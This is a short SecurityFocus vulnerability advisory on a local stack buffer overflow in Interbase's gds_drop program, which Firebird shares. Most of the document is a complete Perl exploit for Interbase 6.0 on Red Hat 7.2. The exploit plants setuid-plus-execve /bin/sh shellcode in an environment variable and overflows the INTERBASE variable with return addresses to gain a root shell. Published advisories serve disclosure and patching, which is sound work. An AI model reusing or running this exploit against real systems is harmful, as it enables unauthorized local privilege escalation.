source: http://www.securityfocus.com/bid/5044/info

Interbase is a database distributed and maintained by Borland. It is available for Unix and Linux operating systems.

A buffer overflow has been discovered in the gds_drop program packaged with Interbase. This problem could allow a local user to execute the program with strings of arbitrary length. By using a custom crafted string, the attacker could overwrite stack memory, including the return address of a function, and potentially execute arbitrary code.

Firebird is based on Borland/Inprise Interbase source code and is therefore also prone to this issue. *

#!/usr/bin/perl -w
#
# gds_drop exploit for Interbase 6.0 linux beta
#
# - tested on redhat 7.2
#
# - Developed in the Snosoft Cerebrum test labs
# - (http://www.snosoft.com) - overflow found by KF
#
# coded by stripey - 15/06/2002 (stripey@snosoft.com)
#

($offset) = @ARGV,$offset || ($offset = 0);

$sc  = "\x90"x512;
$sc .= "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80";
$sc .= "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b";
$sc .= "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd";
$sc .= "\x80\xe8\xdc\xff\xff\xff/bin/sh";

$ENV{"FOO"} = $sc;

$buf  = pack("l",(0xbffffdc0+$offset))x86;
$buf .= "A";

$ENV{"INTERBASE"} = $buf;

exec("/usr/local/interbase/bin/gds_drop");